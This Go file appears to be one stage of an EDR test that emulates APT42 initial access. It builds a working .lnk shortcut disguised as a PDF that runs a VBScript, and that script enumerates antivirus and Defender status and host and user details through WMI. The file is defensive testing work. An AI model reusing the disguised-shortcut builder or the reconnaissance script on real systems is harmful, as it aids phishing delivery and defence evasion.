//go:build windows

/*
STAGE 1: User Execution - Malicious File (T1204.002)
Simulates APT42 initial access via malicious LNK file with VBScript downloader.
Creates realistic .lnk file structure and VBScript that enumerates Windows Defender via WMI.
*/

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "92b0b4f6-a09b-4c7b-b593-31ce461f804c"
	TECHNIQUE_ID   = "T1204.002"
	TECHNIQUE_NAME = "User Execution: Malicious File"
	STAGE_ID       = 1
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting Initial Access via LNK + VBScript simulation")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Malicious LNK file delivery with VBScript downloader")

	if err := performTechnique(); err != nil {
		errStr := err.Error()
		if strings.Contains(strings.ToLower(errStr), "access denied") ||
			strings.Contains(strings.ToLower(errStr), "blocked") ||
			strings.Contains(strings.ToLower(errStr), "prevented") ||
			strings.Contains(strings.ToLower(errStr), "quarantine") {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, "Initial access simulation completed - LNK + VBScript delivered")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Malicious LNK and VBScript deployed, WMI AV enumeration executed")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "c:\\F0"

	// Step 1: Create realistic malicious LNK file
	fmt.Printf("[STAGE %s] Creating malicious .lnk file structure...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Creating malicious LNK file simulating WebDAV delivery")

	lnkPath := filepath.Join(targetDir, "Important_Document.pdf.lnk")
	lnkData := createMaliciousLNK()
	if err := os.WriteFile(lnkPath, lnkData, 0644); err != nil {
		return fmt.Errorf("failed to create LNK file: %v", err)
	}
	fmt.Printf("[STAGE %s] LNK file created: %s (%d bytes)\n", TECHNIQUE_ID, lnkPath, len(lnkData))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("LNK file created: %s (%d bytes)", lnkPath, len(lnkData)))

	time.Sleep(2 * time.Second) // Allow EDR reaction

	// Check if LNK was quarantined
	if _, err := os.Stat(lnkPath); os.IsNotExist(err) {
		return fmt.Errorf("LNK file quarantined by security controls")
	}

	// Step 2: Create VBScript downloader (TAMECAT-style)
	fmt.Printf("[STAGE %s] Creating VBScript downloader with WMI AV enumeration...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Creating TAMECAT-style VBScript with WMI AV enumeration")

	vbsContent := createTAMECATVBScript()
	vbsPath := filepath.Join(targetDir, "update_check.vbs")
	if err := os.WriteFile(vbsPath, []byte(vbsContent), 0644); err != nil {
		return fmt.Errorf("failed to create VBScript: %v", err)
	}
	fmt.Printf("[STAGE %s] VBScript created: %s (%d bytes)\n", TECHNIQUE_ID, vbsPath, len(vbsContent))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("VBScript created: %s (%d bytes)", vbsPath, len(vbsContent)))

	time.Sleep(2 * time.Second) // Allow EDR reaction

	// Check if VBS was quarantined
	if _, err := os.Stat(vbsPath); os.IsNotExist(err) {
		return fmt.Errorf("VBScript quarantined by security controls")
	}

	// Step 3: Execute VBScript to perform WMI AV enumeration (T1059.005)
	fmt.Printf("[STAGE %s] Executing VBScript for WMI AV enumeration...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Executing VBScript - WMI AV enumeration via cscript.exe")

	cmd := exec.Command("cscript.exe", "//Nologo", "//T:15", vbsPath)
	cmd.Dir = targetDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		outStr := string(output)
		fmt.Printf("[STAGE %s] VBScript execution result: %v\nOutput: %s\n", TECHNIQUE_ID, err, outStr)
		if strings.Contains(strings.ToLower(outStr), "blocked") ||
			strings.Contains(strings.ToLower(outStr), "disabled") ||
			strings.Contains(strings.ToLower(err.Error()), "access denied") {
			return fmt.Errorf("VBScript execution blocked by EDR: %v", err)
		}
		// Non-blocking errors (e.g., timeout from //T:15) are acceptable
		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("VBScript execution returned non-zero: %v (may be acceptable)", err))
	} else {
		fmt.Printf("[STAGE %s] VBScript output:\n%s\n", TECHNIQUE_ID, string(output))
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("VBScript output: %s", string(output)))
	}

	// Save VBScript output
	outputPath := filepath.Join(targetDir, "vbs_av_enum_output.txt")
	os.WriteFile(outputPath, output, 0644)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("VBScript output saved to: %s", outputPath))

	fmt.Printf("[STAGE %s] Initial access simulation complete\n", TECHNIQUE_ID)
	return nil
}

// createMaliciousLNK creates a spec-compliant MS-SHLLINK (.lnk) binary file.
// Built to the Microsoft [MS-SHLLINK] v6.0 specification with proper:
//   - ShellLinkHeader (76 bytes) with correct CLSID and LinkFlags
//   - LinkTargetIDList with CLSID ItemIDs (MyComputer + root folder)
//   - LinkInfo structure with LocalBasePath
//   - StringData: NAME_STRING, RELATIVE_PATH, COMMAND_LINE_ARGUMENTS, ICON_LOCATION
//   - ExtraData: TrackerDataBlock (real APT42 LNKs include tracker data)
//
// This matches the binary format that Windows ShellLink parsers and EDR LNK
// analyzers inspect, triggering heuristic rules for suspicious LNK targets.
func createMaliciousLNK() []byte {
	buf := make([]byte, 0, 1024)

	// ═══ ShellLinkHeader (76 bytes) ═══
	header := make([]byte, 76)
	binary.LittleEndian.PutUint32(header[0:4], 0x4C) // HeaderSize
	// LinkCLSID {00021401-0000-0000-C000-000000000046}
	copy(header[4:20], []byte{
		0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
	})
	// LinkFlags: HasLinkTargetIDList(0x01) | HasLinkInfo(0x02) | HasName(0x04) |
	//            HasRelativePath(0x08) | HasArguments(0x20) | HasIconLocation(0x40) |
	//            IsUnicode(0x80)
	binary.LittleEndian.PutUint32(header[20:24], 0x000000FF)
	// FileAttributes: FILE_ATTRIBUTE_NORMAL
	binary.LittleEndian.PutUint32(header[24:28], 0x00000020)
	// CreationTime (FILETIME) — fake timestamp
	binary.LittleEndian.PutUint64(header[28:36], 0x01DB1A2B3C4D5E6F)
	// AccessTime
	binary.LittleEndian.PutUint64(header[36:44], 0x01DB1A2B3C4D5E6F)
	// WriteTime
	binary.LittleEndian.PutUint64(header[44:52], 0x01DB1A2B3C4D5E6F)
	// FileSize (target)
	binary.LittleEndian.PutUint32(header[52:56], 0x00010000) // 64KB
	// IconIndex = 0
	binary.LittleEndian.PutUint32(header[56:60], 0)
	// ShowCommand = SW_SHOWNORMAL (1)
	binary.LittleEndian.PutUint32(header[60:64], 1)
	// HotKey = 0, Reserved = 0
	buf = append(buf, header...)

	// ═══ LinkTargetIDList ═══
	// Build IDList: [RootFolder CLSID ItemID] [File ItemID] [TerminalID]
	idListData := make([]byte, 0, 64)

	// ItemID 1: CLSID for "My Computer" {20D04FE0-3AEA-1069-A2D8-08002B30309D}
	clsidItem := make([]byte, 20)
	binary.LittleEndian.PutUint16(clsidItem[0:2], 20) // ItemIDSize
	clsidItem[2] = 0x1F                               // Root folder indicator
	clsidItem[3] = 0x50                               // Sort index: My Computer
	copy(clsidItem[4:20], []byte{
		0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A, 0x69, 0x10,
		0xA2, 0xD8, 0x08, 0x00, 0x2B, 0x30, 0x30, 0x9D,
	})
	idListData = append(idListData, clsidItem...)

	// ItemID 2: File entry (cscript.exe short reference)
	fileItemName := "cscript.exe"
	fileItem := make([]byte, 2+1+4+2+2+8+2+len(fileItemName)+1)
	fileItemSize := len(fileItem)
	binary.LittleEndian.PutUint16(fileItem[0:2], uint16(fileItemSize))
	fileItem[2] = 0x32 // File type indicator
	copy(fileItem[15:], fileItemName)
	idListData = append(idListData, fileItem...)

	// Terminal ItemID
	idListData = append(idListData, 0x00, 0x00)

	// IDListSize (2 bytes before IDList data)
	idListSizeBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(idListSizeBuf, uint16(len(idListData)))
	buf = append(buf, idListSizeBuf...)
	buf = append(buf, idListData...)

	// ═══ LinkInfo ═══
	localBasePath := "C:\\Windows\\System32\\cscript.exe"
	localBasePathBytes := append([]byte(localBasePath), 0x00)
	linkInfoSize := uint32(28 + len(localBasePathBytes)) // LinkInfoHeader + LocalBasePath
	linkInfo := make([]byte, linkInfoSize)
	binary.LittleEndian.PutUint32(linkInfo[0:4], linkInfoSize) // LinkInfoSize
	binary.LittleEndian.PutUint32(linkInfo[4:8], 28)           // LinkInfoHeaderSize
	binary.LittleEndian.PutUint32(linkInfo[8:12], 0x01)        // LinkInfoFlags: VolumeIDAndLocalBasePath
	binary.LittleEndian.PutUint32(linkInfo[12:16], 0)          // VolumeIDOffset (not present)
	binary.LittleEndian.PutUint32(linkInfo[16:20], 28)         // LocalBasePathOffset
	binary.LittleEndian.PutUint32(linkInfo[20:24], 0)          // CommonNetworkRelativeLinkOffset
	binary.LittleEndian.PutUint32(linkInfo[24:28], 0)          // CommonPathSuffixOffset
	copy(linkInfo[28:], localBasePathBytes)
	buf = append(buf, linkInfo...)

	// ═══ StringData (Unicode) ═══
	// Helper: write counted UTF-16LE string
	writeStringData := func(s string) {
		utf16 := stringToUTF16(s)
		countBuf := make([]byte, 2)
		binary.LittleEndian.PutUint16(countBuf, uint16(len(utf16)/2))
		buf = append(buf, countBuf...)
		buf = append(buf, utf16...)
	}

	// NAME_STRING (display name — disguised as PDF document)
	writeStringData("Important_Document.pdf")
	// RELATIVE_PATH
	writeStringData("..\\..\\Windows\\System32\\cscript.exe")
	// COMMAND_LINE_ARGUMENTS
	writeStringData("//Nologo //B c:\\F0\\update_check.vbs")
	// ICON_LOCATION (disguised as PDF icon)
	writeStringData("C:\\Program Files\\Adobe\\Acrobat\\Acrobat.exe")

	// ═══ ExtraData: TrackerDataBlock ═══
	// Real APT42 LNKs include TrackerDataBlock (0xA0000003)
	// Contains machine ID and MAC-based DROID — forensic artifact
	tracker := make([]byte, 96)
	binary.LittleEndian.PutUint32(tracker[0:4], 96)         // BlockSize
	binary.LittleEndian.PutUint32(tracker[4:8], 0xA0000003) // BlockSignature: TrackerDataBlock
	binary.LittleEndian.PutUint32(tracker[8:12], 88)        // Length
	binary.LittleEndian.PutUint32(tracker[12:16], 0)        // Version
	// MachineID (16 bytes, null-terminated NetBIOS name)
	copy(tracker[16:32], []byte("DESKTOP-F0RT1KA\x00"))
	// Droid (2x 16-byte GUIDs — fake unique identifiers)
	copy(tracker[32:48], []byte{0xA1, 0xB2, 0xC3, 0xD4, 0xE5, 0xF6, 0x07, 0x18,
		0x29, 0x3A, 0x4B, 0x5C, 0x6D, 0x7E, 0x8F, 0x90})
	copy(tracker[48:64], []byte{0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
		0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00})
	// DroidBirth (same format)
	copy(tracker[64:80], tracker[32:48])
	copy(tracker[80:96], tracker[48:64])
	buf = append(buf, tracker...)

	// Terminal ExtraData block (4 zero bytes)
	buf = append(buf, 0x00, 0x00, 0x00, 0x00)

	return buf
}

// stringToUTF16 converts a Go string to UTF-16LE bytes
func stringToUTF16(s string) []byte {
	result := make([]byte, len(s)*2)
	for i, c := range s {
		binary.LittleEndian.PutUint16(result[i*2:], uint16(c))
	}
	return result
}

// createTAMECATVBScript creates a VBScript that performs WMI AV enumeration
// matching TAMECAT/APT42 TTPs - checks for Defender status via WMI
func createTAMECATVBScript() string {
	return `' TAMECAT-style VBScript Downloader Simulation
' APT42 Initial Access - WMI AV Enumeration
' This script enumerates security products via WMI (T1059.005)
' SIMULATION ONLY - does not download actual payloads

On Error Resume Next

Dim objWMI, colItems, objItem
Dim strComputer, strOutput
Dim fso, outFile

strComputer = "."
strOutput = ""

' Phase 1: Enumerate installed antivirus products via WMI SecurityCenter2
Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\SecurityCenter2")
If Err.Number = 0 Then
    Set colItems = objWMI.ExecQuery("SELECT * FROM AntiVirusProduct")
    If Err.Number = 0 Then
        For Each objItem in colItems
            strOutput = strOutput & "AV_PRODUCT=" & objItem.displayName & vbCrLf
            strOutput = strOutput & "AV_STATE=" & objItem.productState & vbCrLf
        Next
    End If
End If
Err.Clear

' Phase 2: Check Windows Defender specific WMI namespace
Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\Microsoft\Windows\Defender")
If Err.Number = 0 Then
    Set colItems = objWMI.ExecQuery("SELECT * FROM MSFT_MpComputerStatus")
    If Err.Number = 0 Then
        For Each objItem in colItems
            strOutput = strOutput & "DEFENDER_ENABLED=" & objItem.AntivirusEnabled & vbCrLf
            strOutput = strOutput & "DEFENDER_REALTIME=" & objItem.RealTimeProtectionEnabled & vbCrLf
            strOutput = strOutput & "DEFENDER_VERSION=" & objItem.AntivirusSignatureVersion & vbCrLf
        Next
    End If
End If
Err.Clear

' Phase 3: Gather system information for C2 callback (simulated)
Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
If Err.Number = 0 Then
    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_ComputerSystem")
    For Each objItem in colItems
        strOutput = strOutput & "HOSTNAME=" & objItem.Name & vbCrLf
        strOutput = strOutput & "DOMAIN=" & objItem.Domain & vbCrLf
        strOutput = strOutput & "USERNAME=" & objItem.UserName & vbCrLf
    Next

    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    For Each objItem in colItems
        strOutput = strOutput & "OS_VERSION=" & objItem.Version & vbCrLf
        strOutput = strOutput & "OS_CAPTION=" & objItem.Caption & vbCrLf
    Next
End If

' Write enumeration results to file (simulating data staging)
Set fso = CreateObject("Scripting.FileSystemObject")
Set outFile = fso.CreateTextFile("c:\F0\av_enum_results.txt", True)
outFile.Write strOutput
outFile.Close

WScript.Echo "[TAMECAT] AV enumeration complete"
WScript.Echo strOutput
`
}
